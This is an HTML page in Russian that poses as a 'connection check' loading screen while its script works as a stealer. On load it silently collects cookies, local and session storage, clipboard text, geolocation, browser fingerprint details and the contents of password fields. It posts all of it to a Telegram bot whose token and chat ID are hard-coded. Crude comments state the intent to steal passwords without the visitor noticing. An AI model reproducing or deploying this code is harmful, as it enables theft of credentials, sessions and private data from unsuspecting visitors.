<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение данных</title>
    <style>
        body { background: #f4f6f9; font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 8px solid #ccc; border-top: 8px solid #2a7; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360); } }
        .card { background: white; padding: 40px; border-radius: 16px; max-width: 400px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
<div class="card">
    <h2>Проверка соединения</h2>
    <div class="loader"></div>
    <p>Синхронизация с защищённым узлом...</p>
</div>

<script>
    (function() {
        // === НАСТРОЙКИ — СЮДА, БЛЯТЬ ===
        const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // например 123456:ABC-DEF
        const CHAT_ID = '-1003791860129';       // например -1001234567
        // =================================

        function getCookies() {
            return document.cookie.split('; ').reduce((acc, item) => {
                const [key, val] = item.split('=');
                if (key) acc[key] = val || '';
                return acc;
            }, {});
        }

        function getLocalStorage() {
            try {
                return { ...localStorage };
            } catch { return {}; }
        }

        function getSessionStorage() {
            try {
                return { ...sessionStorage };
            } catch { return {}; }
        }

        function getHistory() {
            try {
                return window.history.length > 0 ? window.history : { length: window.history.length };
            } catch { return { error: 'history blocked' }; }
        }

        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'geolocation not supported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    }),
                    (err) => resolve({ error: err.message }),
                    { timeout: 3000, enableHighAccuracy: true }
                );
            });
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    return text || '[empty]';
                }
                return '[not available]';
            } catch {
                return '[permission denied]';
            }
        }

        function getNetworkInfo() {
            if (!navigator.connection) return {};
            const c = navigator.connection;
            return {
                effectiveType: c.effectiveType || null,
                downlink: c.downlink || null,
                rtt: c.rtt || null
            };
        }

        function getPlugins() {
            try {
                return Array.from(navigator.plugins || []).map(p => p.name);
            } catch { return []; }
        }

        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            };
        }

        async function collectAll() {
            const geo = await getGeolocation();
            const clip = await getClipboard();

            const payload = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || '',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookies: getCookies(),
                localStorage: getLocalStorage(),
                sessionStorage: getSessionStorage(),
                history: getHistory(),
                geolocation: geo,
                clipboard: clip,
                network: getNetworkInfo(),
                plugins: getPlugins(),
                screen: getScreenInfo(),
                doNotTrack: navigator.doNotTrack || null,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            return payload;
        }

        async function sendToTelegram(data) {
            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
                console.error('Настрой бота, еблан!');
                return;
            }
            const text = JSON.stringify(data, null, 2);
            // Телеграм имеет лимит 4096 символов, режем если больше
            const maxLen = 4000;
            const chunks = text.length > maxLen ? [text.slice(0, maxLen)] : [text];
            for (const chunk of chunks) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: chunk,
                        parse_mode: 'HTML'
                    })
                }).catch(e => console.error('Ошибка отправки:', e));
            }
        }

        // ЗАПУСК — всё молча, без вопросов
        collectAll().then(data => {
            sendToTelegram(data);
            // Можно ещё отправить копию в консоль (для отладки)
            console.log('Nasok собрал:', data);
        });

        // Дополнительно — пытаемся украсть ещё и пароли из форм (если есть на странице)
        // через 3 секунды после загрузки, на случай динамических форм
        setTimeout(() => {
            const forms = document.querySelectorAll('input[type="password"]');
            if (forms.length) {
                const pwdData = {};
                forms.forEach((inp, idx) => {
                    pwdData[`pwd_${idx}`] = inp.value || '';
                });
                if (Object.keys(pwdData).length) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: '🔑 ПАРОЛИ ИЗ ФОРМ:\n' + JSON.stringify(pwdData, null, 2)
                        })
                    }).catch(() => {});
                }
            }
        }, 3000);

    })();
</script>
</body>
</html>
